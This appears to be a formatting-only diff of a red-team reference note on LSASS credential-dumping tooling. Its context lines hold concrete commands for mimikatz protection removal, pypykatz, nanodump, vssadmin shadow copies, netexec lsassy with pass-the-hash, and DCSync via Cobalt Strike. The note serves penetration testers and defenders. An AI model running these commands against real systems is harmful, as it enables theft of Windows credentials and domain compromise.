@@ -17,7 +17,7 @@ linked:
 ---
 # LSASS Dumping - Tooling
 
-***
+---
 
 ## mimikatz (Windows on-host)
 
@@ -38,7 +38,7 @@ linked:
 | `mimikatz # !processprotect /process:lsass.exe /remove` | Remove LSASS protection | Post-driver. |
 ^lsass-tool-mimi
 
-___
+---
 
 ## pypykatz (Linux/Mac offline)
 
@@ -58,7 +58,7 @@ pip install pypykatz
 pypykatz lsa minidump lsass.dmp -o creds.txt -k tickets/
 ```
 
-___
+---
 
 ## nanodump
 
@@ -80,7 +80,7 @@ nanodump.exe -w C:\temp\lsass.dmp -v
 nanodump.exe --duplicate -w C:\temp\lsass.dmp
 ```
 
-___
+---
 
 ## Native LOLBins
 
@@ -95,7 +95,7 @@ ___
 | `vssadmin create shadow /for=C:` | VSS snapshot (DC NTDS path) | Adjacent. |
 ^lsass-tool-lolbin
 
-___
+---
 
 ## netexec / crackmapexec Modules
 
@@ -115,7 +115,7 @@ nxc smb hosts.txt -u admin -H <NT> --local-auth -M lsassy
 # Output: hashes parseados directo desde host
 ```
 
-___
+---
 
 ## Cobalt Strike BOFs
 
@@ -126,7 +126,7 @@ ___
 | `lsadump dcsync /domain:corp.local /user:krbtgt` | DCSync via BOF | Adjacent. |
 ^lsass-tool-bof
 
-___
+---
 
 ## SafetyKatz / Custom .NET
 
@@ -138,7 +138,7 @@ ___
 | DInjector | Custom DLL injector con direct syscalls | Advanced. |
 ^lsass-tool-custom
 
-___
+---
 
 ## DPAPI Tooling Adjacent
 
@@ -150,7 +150,7 @@ ___
 | `SharpDPAPI` | C# DPAPI extraction | Modern Windows. |
 ^lsass-tool-dpapi
 
-___
+---
 
 ## Recursos
 
@@ -167,4 +167,4 @@ ___
 | MITRE ATT&CK T1003.001 | `https://attack.mitre.org/techniques/T1003/001/` |
 ^lsass-tool-resources
 
-***
+---
